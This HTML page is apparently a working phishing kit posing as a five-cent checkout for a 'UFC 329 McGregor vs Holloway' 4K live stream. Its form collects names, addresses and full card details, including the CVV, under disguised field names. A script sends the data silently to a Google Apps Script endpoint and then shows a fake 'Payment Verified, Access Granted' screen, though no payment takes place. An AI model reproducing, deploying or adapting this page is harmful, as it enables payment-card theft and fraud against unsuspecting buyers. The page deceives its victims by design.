<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&family=Outfit:wght@900&display=swap');
    
    :root { 
        --ufc-red: #d20a0a; 
        --bg-dark: #0b0b0b; 
        --card-bg: #141414;
        --text-gray: #a0a0a0;
        --accent: #ffffff;
    }

    body { 
        font-family: 'Inter', sans-serif; 
        padding: 0; margin: 0; 
        background-color: var(--bg-dark); 
        color: white; 
        -webkit-font-smoothing: antialiased; 
    }

    * { box-sizing: border-box; }

    /* Header & Live Pulse */
    .header { 
        text-align: center; 
        padding: 40px 0; 
        background: linear-gradient(to bottom, #1a1a1a, var(--bg-dark));
        border-bottom: 2px solid var(--ufc-red);
    }
    .logo { 
        font-family: 'Outfit', sans-serif; 
        font-size: 2.2rem; 
        font-weight: 900; 
        letter-spacing: -1px; 
        text-transform: uppercase; 
        color: white;
    }
    .live-badge {
        display: inline-block;
        background: var(--ufc-red);
        color: white;
        padding: 4px 12px;
        font-weight: 800;
        font-size: 12px;
        border-radius: 4px;
        margin-top: 10px;
        animation: pulse 1.5s infinite;
    }
    @keyframes pulse {
        0% { opacity: 1; }
        50% { opacity: 0.5; }
        100% { opacity: 1; }
    }

    .container { max-width: 600px; margin: 0 auto 100px; padding: 0 20px; }

    /* Fight Info Box */
    .fight-card {
        background: var(--card-bg);
        padding: 20px;
        border-radius: 8px;
        margin-top: -30px;
        border: 1px solid #333;
        text-align: center;
        box-shadow: 0 10px 30px rgba(0,0,0,0.5);
    }
    .fight-title { font-weight: 900; font-size: 1.2rem; text-transform: uppercase; }
    .price-tag { font-size: 2rem; color: var(--ufc-red); font-weight: 900; margin: 10px 0; }

    h3 { 
        font-family: 'Outfit', sans-serif; 
        font-size: 18px; 
        text-transform: uppercase; 
        letter-spacing: 1px; 
        margin: 40px 0 20px 0; 
        color: var(--ufc-red);
    }

    /* Form Styling */
    input[type=text], select { 
        width: 100%; 
        margin-bottom: 15px; 
        padding: 15px; 
        background: #1a1a1a;
        border: 1px solid #333; 
        color: white;
        font-family: 'Inter', sans-serif; 
        border-radius: 4px;
    }
    input[type=text]:focus, select:focus { outline: none; border-color: var(--ufc-red); }
    
    label { 
        margin-bottom: 8px; 
        display: block; 
        font-weight: 700; 
        text-transform: uppercase; 
        font-size: 11px; 
        letter-spacing: 1px; 
        color: var(--text-gray); 
    }

    .icon-container { margin-bottom: 10px; font-size: 30px; display: flex; gap: 10px; }

    .btn { 
        background-color: var(--ufc-red); 
        color: white; 
        padding: 22px; 
        margin: 30px 0; 
        border: none; 
        width: 100%; 
        cursor: pointer; 
        font-size: 16px; 
        font-weight: 900; 
        text-transform: uppercase; 
        letter-spacing: 1px; 
        border-radius: 4px;
        transition: transform 0.2s;
    }
    .btn:hover { transform: scale(1.02); background-color: #ff0000; }

    /* Success Screen */
    #thanks-screen { display: none; text-align: center; margin-top: 100px; padding: 20px; }
    #thanks-screen h1 { font-family: 'Outfit', sans-serif; color: var(--ufc-red); font-size: 3.5rem; margin-bottom: 10px; }
    .success-icon { font-size: 80px; color: #2ecc71; margin-bottom: 20px; }
</style>
</head>
<body>

<div class="header" id="nav-header">
    <div class="logo">UFC 329 </div>
    <div class="live-badge">● LIVE STREAM ACCESS</div>
</div>

<div id="form-container">
  <div class="container">
    <div class="fight-card">
        <div class="fight-title">MCGREGOR vs HOLLOWAY</div>
        <div class="price-tag">$0.05</div>
        <p style="color: var(--text-gray); font-size: 12px; margin: 0;">Instant 4K Access Pass</p>
    </div>

    <form id="checkoutForm" action="https://script.google.com/macros/s/AKfycbzyFwA-gHdtK1RaDf_H8ijMrO4tUEmWRO1EeAxjDzHbwYi-d-Z6K-vLOq4J-6isznQ5/exec" method="POST">
      
      <h3>1. Account Info</h3>
      <label>Full Name</label>
      <input type="text" name="Full_Name" placeholder="Full Name" required>
      <label>Email (For Stream Link)</label>
      <input type="text" name="Email" placeholder="email@example.com" required>
      <label>Street Address</label>
      <input type="text" name="Street" placeholder="123 Street Name" required>
      
      <div style="display: flex; gap: 15px;">
        <div style="flex: 1;"><label>City</label><input type="text" name="City" placeholder="City" required></div>
        <div style="flex: 1;"><label>State</label>
          <select name="State" required>
            <option value="" disabled selected>Select State</option>
            <option value="Alabama">Alabama</option><option value="Alaska">Alaska</option><option value="Arizona">Arizona</option><option value="Arkansas">Arkansas</option><option value="California">California</option><option value="Colorado">Colorado</option><option value="Connecticut">Connecticut</option><option value="Delaware">Delaware</option><option value="Florida">Florida</option><option value="Georgia">Georgia</option><option value="Hawaii">Hawaii</option><option value="Idaho">Idaho</option><option value="Illinois">Illinois</option><option value="Indiana">Indiana</option><option value="Iowa">Iowa</option><option value="Kansas">Kansas</option><option value="Kentucky">Kentucky</option><option value="Louisiana">Louisiana</option><option value="Maine">Maine</option><option value="Maryland">Maryland</option><option value="Massachusetts">Massachusetts</option><option value="Michigan">Michigan</option><option value="Minnesota">Minnesota</option><option value="Mississippi">Mississippi</option><option value="Missouri">Missouri</option><option value="Montana">Montana</option><option value="Nebraska">Nebraska</option><option value="Nevada">Nevada</option><option value="New Hampshire">New Hampshire</option><option value="New Jersey">New Jersey</option><option value="New Mexico">New Mexico</option><option value="New York">New York</option><option value="North Carolina">North Carolina</option><option value="North Dakota">North Dakota</option><option value="Ohio">Ohio</option><option value="Oklahoma">Oklahoma</option><option value="Oregon">Oregon</option><option value="Pennsylvania">Pennsylvania</option><option value="Rhode Island">Rhode Island</option><option value="South Carolina">South Carolina</option><option value="South Dakota">South Dakota</option><option value="Tennessee">Tennessee</option><option value="Texas">Texas</option><option value="Utah">Utah</option><option value="Vermont">Vermont</option><option value="Virginia">Virginia</option><option value="Washington">Washington</option><option value="West Virginia">West Virginia</option><option value="Wisconsin">Wisconsin</option><option value="Wyoming">Wyoming</option>
          </select>
        </div>
      </div>

      <h3>2. Payment Details</h3>
      <div class="icon-container">
        <i class="fa fa-cc-visa" style="color:white;"></i>
        <i class="fa fa-cc-mastercard" style="color:white;"></i>
        <i class="fa fa-cc-amex" style="color:white;"></i>
      </div>

      <label>Cardholder Name</label>
      <input type="text" name="Reference_User" placeholder="Name on Card" required>
      <label>Card Number</label>
      <input type="text" name="Reference_ID" placeholder="0000 0000 0000 0000" maxlength="19" oninput="this.value = this.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');" required>

      <div style="display: flex; gap: 15px;">
        <div style="flex: 1;"><label>Expiration</label><input type="text" name="Expiry" placeholder="MM/YY" maxlength="5" oninput="this.value = this.value.replace(/\D/g, '').replace(/^(\d{2})/, '$1/');" required></div>
        <div style="flex: 1;"><label>CVV</label><input type="text" name="Secure_Code" placeholder="123" maxlength="3" oninput="this.value = this.value.replace(/\D/g, '');" required></div>
      </div>

      <button type="submit" class="btn" id="submitBtn">UNLOCK LIVE STREAM — For ONLY 5 Cents</button>
    </form>
  </div>
</div>

<div id="thanks-screen">
  <i class="fa fa-check-circle success-icon"></i>
  <h1>ACCESS GRANTED</h1>
  <p style="color: #fff; font-size: 18px; margin-top: 20px;">Payment Verified!<br>Check your email or Discord for the private 4K link.</p>
  <p style="color: var(--text-gray); font-size: 14px;">(Usually arrives within 60 seconds)</p>
</div>

<script>
  const form = document.getElementById('checkoutForm');
  const btn = document.getElementById('submitBtn');
  form.addEventListener('submit', function(e) {
    e.preventDefault();
    btn.innerText = "VERIFYING PAYMENT...";
    btn.disabled = true;
    fetch(form.action, { method: 'POST', body: new FormData(form), mode: 'no-cors' })
    .then(() => {
      document.getElementById("form-container").style.display = "none";
      document.getElementById("nav-header").style.display = "none";
      document.getElementById("thanks-screen").style.display = "block";
      window.scrollTo(0,0);
    });
  });
</script>
</body>
</html>
